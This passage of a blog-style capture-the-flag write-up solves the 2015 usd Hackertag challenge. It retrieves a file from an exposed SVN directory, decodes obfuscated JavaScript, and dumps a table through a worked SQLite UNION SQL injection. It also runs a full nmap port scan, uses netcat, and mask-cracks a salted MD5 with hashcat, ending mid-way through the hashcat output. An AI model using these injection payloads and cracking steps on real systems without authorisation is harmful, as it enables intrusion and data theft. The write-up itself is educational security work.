</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pd.read_sql(<span style="color:#ed9d13">&#34;SELECT local_relpath, checksum FROM NODES&#34;</span>, con)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>local_relpath</th>
      <th>checksum</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> download.php</td>
      <td> $sha1$71d7c4326159dff73464c31c8b8f3ee0aad3a805</td>
    </tr>
    <tr>
      <th>1</th>
      <td>             </td>
      <td>                                           None</td>
    </tr>
  </tbody>
</table>
</div>
<p>Obviously there is a <code>download.php</code> which we can retrieve from the SVN repo. Using the <a href="http://pen-testing.sans.org/blog/2012/12/06/all-your-svn-are-belong-to-us">tutorial</a> one can access the files inside the repository very easily:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>/.svn/pristine/<span style="color:#3677a9">71</span>/<span style="color:#3677a9">71</span>d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
</code></pre></div><pre><code>&lt;?php
include &quot;src/header.php&quot;;
// Todo: Challenge fuer Token 102342 bauen.
echo '
        &lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;
           &lt;p&gt;Die folgende Datei steht zum Download bereit:&lt;/p&gt;
	&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;dl/usd_Hackertag_2015.pdf&quot;&gt;usd Hackertag Poster (PDF-Format)&lt;/a&gt;&lt;/li&gt;
	&lt;/ul&gt;
';

echo &quot;&lt;/div&gt;&lt;/div&gt;&quot;;
include &quot;src/menu.php&quot;;
include &quot;src/footer.php&quot;;
?&gt;
</code></pre>
<p>There is this line:</p>
<blockquote>
<p>Todo: Challenge fuer <strong>Token 102342</strong> bauen.</p>
</blockquote>
<h2 id="3rd-token">3rd Token</h2>
<p>Now let&rsquo;s have a look at the PDF under http://82.195.79.41/download.php.</p>
<p><img src="/posts/img/2015/hackertag/9ca3a31f6400a2bf414ad3802d296cd3.png" alt="hackertag"></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>file usd_Hackertag_2015.pdf
</code></pre></div><pre><code>usd_Hackertag_2015.pdf: PDF document, version 1.3
</code></pre>
<p>When you look at it (PDF viewer) nothing special about it.</p>
<p><img src="/posts/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png" alt="hackertag"></p>
<p>Let&rsquo;s extract all available strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>strings usd_Hackertag_2015.pdf | tail -n <span style="color:#3677a9">20</span>
</code></pre></div><pre><code>/ModDate (D:20150220100358+01'00')
/Producer (Adobe PDF library 10.01)
/Title (usd Hackertag 2015)
/Trapped /False
/Subject (Token: 338912)
endobj
xref
0000000000 65535 f
0000608444 00000 n
0000651051 00000 n
trailer
/Size 44
/Root 6 0 R
/Info 4 0 R
/ID [ &lt;B86554FD3FAA6D459E2C0B3D46980BDB&gt; &lt;f302C8F15AC3244B86122640F6B03D76&gt; ]
/Prev 116
%EndExifToolUpdate 608422
startxref
651378
%%EOF
</code></pre>
<p>Again bingo: <strong>Token: 338912</strong></p>
<h2 id="4th-token">4th Token</h2>
<p>Now let&rsquo;s have a look at the main <a href="http://82.195.79.41/">web-page</a>. Somewhere you&rsquo;ll see this line:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script type=&#34;text/javascript&#34; src=&#34;http://82.195.79.41/js/jquery/jquery.js&#34;&gt;&lt;/script&gt;
</code></pre></div><p>But wait a sec. JQuery? That sounds suspicious.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>/js/jquery/jquery.js
</code></pre></div><pre><code>eval(String.fromCharCode(105, 102, 32, 40, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 111, 115, 116, 110, 97, 109, 101, 32, 61, 61, 32, 34, 49, 50, 55, 46, 48, 46, 48, 46, 49, 34, 41, 32, 123, 10, 118, 97, 114, 32, 95, 48, 120, 98, 55, 57, 97, 61, 91, 34, 92, 120, 53, 55, 92, 120, 54, 57, 92, 120, 54, 67, 92, 120, 54, 67, 92, 120, 54, 66, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 55, 65, 92, 120, 55, 53, 92, 120, 55, 50, 92, 120, 70, 67, 92, 120, 54, 51, 92, 120, 54, 66, 92, 120, 50, 48, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 52, 92, 120, 54, 52, 92, 120, 55, 57, 92, 120, 50, 69, 92, 120, 50, 48, 92, 120, 52, 52, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 50, 48, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 54, 56, 92, 120, 54, 53, 92, 120, 54, 57, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 50, 48, 92, 120, 53, 52, 92, 120, 54, 70, 92, 120, 54, 66, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 54, 67, 92, 120, 54, 49, 92, 120, 55, 53, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 51, 65, 92, 120, 50, 48, 92, 120, 51, 52, 92, 120, 51, 49, 92, 120, 51, 55, 92, 120, 51, 56, 92, 120, 51, 53, 92, 120, 51, 53, 34, 93, 59, 97, 108, 101, 114, 116, 40, 95, 48, 120, 98, 55, 57, 97, 91, 48, 93, 41, 59, 10, 125));
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">char_codes = <span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195.79.41</span>/js/jquery/jquery.js
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Convert char codes to string</span>
char_codes = char_codes[<span style="color:#3677a9">5</span>][<span style="color:#3677a9">25</span>:-<span style="color:#3677a9">3</span>].split(<span style="color:#ed9d13">&#39;,&#39;</span>)
string_message = <span style="color:#ed9d13">&#39;&#39;</span>.join(<span style="color:#24909d">chr</span>(<span style="color:#24909d">int</span>(i)) <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> char_codes)
string_message
</code></pre></div><pre><code>'if (window.location.hostname == &quot;127.0.0.1&quot;) {\nvar _0xb79a=[&quot;\\x57\\x69\\x6C\\x6C\\x6B\\x6F\\x6D\\x6D\\x65\\x6E\\x20\\x7A\\x75\\x72\\xFC\\x63\\x6B\\x20\\x66\\x72\\x65\\x64\\x64\\x79\\x2E\\x20\\x44\\x65\\x72\\x20\\x67\\x65\\x68\\x65\\x69\\x6D\\x65\\x20\\x54\\x6F\\x6B\\x65\\x6E\\x20\\x6C\\x61\\x75\\x74\\x65\\x74\\x3A\\x20\\x34\\x31\\x37\\x38\\x35\\x35&quot;];alert(_0xb79a[0]);\n}'
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Decode hex string to ascii</span>
hex_code = string_message[<span style="color:#3677a9">61</span>:-<span style="color:#3677a9">23</span>].replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">x&#39;</span>, <span style="color:#ed9d13">&#39;&#39;</span>)
binascii.unhexlify(hex_code)
</code></pre></div><pre><code>b'Willkommen zur\xfcck freddy. Der geheime Token lautet: 417855'
</code></pre>
<p>Our found token: <strong>417855</strong></p>
<h2 id="5th-token">5th Token</h2>
<p>I must say this part of the challenge was the most &ldquo;challenging&rdquo; one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.</p>
<p>There was this link http://82.195.79.41/liste.php?id=1 which caught my attention from the beginning.</p>
<p><img src="/posts/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png" alt="hackertag"></p>
<p>The first thing I did:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=1&#39;&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">1</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;'1'';&quot;
</code></pre>
<p>Aha.. Ok. Let&rsquo;s try again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=1&#39;%20OR 1=1&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">1</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;';&quot;
</code></pre>
<p>What about the next one?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">20</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
        &lt;div id=&quot;leftcolumn&quot;&gt;
	&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;http://82.195.79.41/index.php&quot;&gt;Startseite&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://82.195.79.41/liste.php&quot;&gt;Todo-Liste&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://82.195.79.41/restricted/index.php&quot;&gt;Backend&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://82.195.79.41/download.php&quot;&gt;Downloads&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://www.usd.de/impressum/&quot; target=&quot;_blank&quot;&gt;Impressum&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://www.usd.de/datenschutz/&quot; target=&quot;_blank&quot;&gt;Datenschutz&lt;/a&gt;&lt;/li&gt;
	&lt;/ul&gt;
        &lt;/div&gt;

        &lt;div id=&quot;footer&quot;&gt;
            &lt;p&gt;&lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Have you noticed this line?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;div id=&#34;contentliquid&#34;&gt;&lt;div id=&#34;content&#34;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#34;https://blog.dornea.nu/liste.php?id=a&#34;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre></div><p><strong>a</strong> and <strong>b</strong> were successfully &ldquo;merged&rdquo; into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has <a href="https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection">sth</a> you can use in your tests. But the most useful thing is to test for <em>string concatenation</em> (nice article <a href="http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/">here</a>). So I&rsquo;ve tried several things:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20CONCAT(&#39;a&#39;, &#39;b&#39;),&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;';&quot;
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;+&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;||&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=ab&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>Well <code>'a'||'b'</code> seemed to work. That syntax is <em>Oracle</em> specific. But also <em>SQLite</em> specific. And this was my biggest mistake: I was searching for Oracle specific injections, but the DBMS was in fact SQLite. Finally I&rsquo;ve constructed this query:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,name</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">qlite_master;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;token&lt;/a&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;public&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>So there are 2 tables available:</p>
<ul>
<li>token</li>
<li>public</li>
</ul>
<p>Let&rsquo;s have a look at the schema of <code>token</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,sql</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">qlite_master%20WHERE%20name=&#39;token&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;CREATE TABLE token (token_val NUMERIC)&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>Ok, now go for it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,token_val</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM%20token;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
</code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;336809&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>Token <strong>336809</strong> is the next one.</p>
<h2 id="6th-and-last-token">6th and last Token</h2>
<p>While looking for tokens, I have seen this message a couple of times:</p>
<p><img src="/posts/img/2015/hackertag/08e649ee3231f07d05c42df5c11de2ab.png" alt="hackertag"></p>
<p>The realm says: <strong>80 is just a number of 65535</strong>. Ok hat was a hint for more undetected ports. I&rsquo;ve run <em>nmap</em> again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># nmap -sT -p 0-65535 82.195.79.41
...
Nmap scan report for 82.195.79.41
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4141/tcp open  oirtgsvc
7777/tcp open  cbt

Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds
</code></pre></div><p>OH! What&rsquo;s behind port <strong>4141</strong>?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>nc <span style="color:#3677a9">82.195.79.41</span> <span style="color:#3677a9">4141</span>
</code></pre></div><pre><code>dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc:l0WMMMMMMMMMMMMMM
dddddddddddddddddddddddxdddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNWMMMMM0:......o0NMMMMMMMMMMMM
dddddddddddddddxxxxdddddddxxxxxddddddddddddddddddddddddddddddxO00kdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,',;cdOl..........';cdNMMMMMMMM
ddddddddddddddxKNNOdddddddOXNXkdddddddddddddddddddddddddddddxxXMMKxddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc....:Kk;............'KMMMMMMMM
ddddddddddddddxNMW0dddddddOWMNkddddddddddddddddddddddddddddddxXMMKdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx;...lO0xc,.........cWMMMMMMMM
ddddddddddddddxNMW0dddddddOWMNkdddxxkO000OkxddddddxkO000kxxdxxXMMKdddxO00OxddxKMMN00XWNKKKXNWWWXKKKNWMMMMMMWXKKKXNWMMMMMMMMMMMMMMMMMX:....:xKKxl,......kMMMMMMMMM
ddddddddddddddxNMW0dddddddOWMNkddxOXWWWNWWWXkxddx0NWWWWWWN0xxxXMMKxdkKWWXOxddxKMMKddxkxxxxxx00kxxxdxONMMMWKkxxxxxxONMMMMMMMMMMMMMMMN0::;....,ckKKkoc:;dNMMMMMMMMM
ddddddddddddddxNMMNKKKKKKKXWMNkddxKXXOxxkKWMNkdx0WWKOxxkXWW0dxXMMKxkNMW0xddxdxKMMKddkKNWNKxdxOXNNNOdd0WMWOxx0NWNKkdkNMMMMMMMMMMMMWK00OOkoo:'...';ldxxl;dXMMMMMMMM
ddddddddddddddxNMMNXXXXXXXNWMNkddddxkkOOO0NMWOdkNMXxddddxkOkdxXMMWXWMNOxdddxdxKMMKddONMMMWOxxKMMMMKxdkWMXxdx00000kxx0WMMMMMMMMMWNK00000000Okdc,.........;OWMMMMMM
ddddddddddddddxNMW0ddddxddOWMNkddkKNWNXXXXWMWOdONMKxdddddxxxdxXMMNKXMWKxdddxdxKMMKddONMMMWOddKMMMMKxdkWMKddxO0000000XWMMMMMMMMMWNK00000000000Okxdxdlc:;;;cXMMMMMM
ddddddddddddddxNMW0dddddddOWMNkxxKMMKxddxONMWOdxXMNkddxxk00OdxXMMKdxXWMXkxdxdxKMMKddONMMMWOddKMMMMKxdkWMXxdxXMMMMMMMMMMMMMMMMMMMMMWN00000000O00O0WMMMMMWWMMMMMMMM
ddddddddddddddxNMW0dddddddOWMNkdd0WMN000KXWMWOddkNWNK00KNMNOdxXMMKddx0NMW0xddxKMMKddONMMMWOddKMMMMKxdkWMMKkxk0KKK0OKWMMMMMMMMMMMMMMWK000000000KWNWMMMMMMMMMMMMMMM
ddddddddddddddx0KKkdddddddkKK0kdxxOKXNXXOx0KKOdddx0KXNNXK0kddxOKKOdxddkKKKkxdxKMMN00KWMMMMK00XMMMMN0OKWMMMWX0OkkOO0XWMMMMMMMMMMMMMMWK000000000NMMMMMMMMMMMMMMMMMM
ddddddddddddddddddddddddddddddddxddxxxxxddddddddddddxxxxddddddddxddddddddddddxKMMMMMMMMMMMMMMMWXXNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK000000000WMMMMMMMMMMMMMMMMMM
ddddddddddddddx0kxdkOOxddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMWK0000KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX00000000KWMMMMMMMMMMMMMMMMMM
ddddddddddddddxOkxkNX0xddxxxddxxxddxxxxddxxxdxxxxdddddxxxxdxdxxxxddxxxxxxddddxKMMMMMMMMMMMMMMN000000KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW00000KK0d:cdKWMMMMMMMMMMMMMM
ddddddddddddddkXOkKWX0xxdkKKxd0Kkx0XKKKOxOXkdkXKxdddx0KKKKOxOKKKKOxOXKKXXkdddxKMMMMMMMMMMMMMMMWNNXK00c'ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMNKKXXXx,.....:kNMMMMMMMMMMMM
ddddddddddddddkN0dON0xdddxONOkX0xON0xxKNk0NOdkNXxdddON0xk0Oxk0OOXXx0NOx0WKxddxKMMMMMMMMMMMMMMMMMMMMNk,...;dKWMMMMMMMMMMMMMMMMMMMMMMMMNKO0Kd.........;0WMMMMMMMMMM
ddddddddddddddkN0dON0xddddx0XKXkxONOxxKNk0NOdkNXxdddONOxxOkkXXO0NXx0NkdOWKxddxKMMMMMMMMMMMMMMMMMMMMMMNOo:...cxKWMMMMMMMMMMMMMMMWNKkoc;ckol:'..........ckKNWMMMMMM
ddddddddddddddkXOdkX0xdddddkNWOddx0XKXXOxxKXKKNKxddxx0XKXXOkKXKKXKx0XkdONKxddxKMMMMMMMMMMMMMMMMMMMMMMMMMWKxc...:ONMMMMMMMMWXOdl;.......'..,clc,..........':dOKWMM
ddddddddddddddxxxxxxxddddxk0X0xddddxxxxdddxxxxxxxddddxxxxxdxxxxxxxxxxxdxxxdddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOd;.':dkkxoc;,......';:ldkOOo,.';lol:,'..........,co
dddddddddddddddddddddddddxkkxddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc'.....',:lox0XNWMMMMMMMNo,..';odddol:;,,,,'...
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNKOO0KNWWMMMMMMMMMMMMMMMMNOc'..,:ldxdddddddooo
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK:....;oddddxxdxxK

*********************************************************
Der folgende Hashwert (MD5) wurde mit dem Salt &quot;Hackertag&quot; erzeugt. 
Der Aufruf war dabei wie folgt: echo -n &quot;Hackertag{Passwort}&quot; | md5sum

d79a2543ddbb8042a6d14851fb098e0d

*********************************************************
</code></pre>
<p><img src="/posts/img/2015/hackertag/61fe1a8df134387a58b7790a891c8443.png" alt="hackertag"></p>
<p>What it basically says, is that a certain MD5 hash was created using <code>echo -n &quot;Hackertag{Password}&quot;</code>, where <code>Hackertag</code> is a salt. And given the hash I should find out the right password. I have never used <code>hashcat</code> before but this was the right time to do it. After reading some docs, I was able to get the right password in ca. 3 seconds :)</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;d79a2543ddbb8042a6d14851fb098e0d&#34;</span> &gt; <span style="color:#24909d">hash</span>
hashcat -m <span style="color:#3677a9">0</span> --attack-mode <span style="color:#3677a9">3</span> <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;Hackertag?l?l?l?l?l?l&#39;</span>
</code></pre></div><pre><code>Initializing hashcat v0.49 with 2 threads and 32mb segment-size...

Added hashes from file hash: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen


Input.Mode: Mask (H) [1]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Ha) [2]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hac) [3]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hack) [4]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


Input.Mode: Mask (Hacke) [5]
Index.....: 0/1 (segment), 1 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: --:--:--:--
Estimated.: --:--:--:--


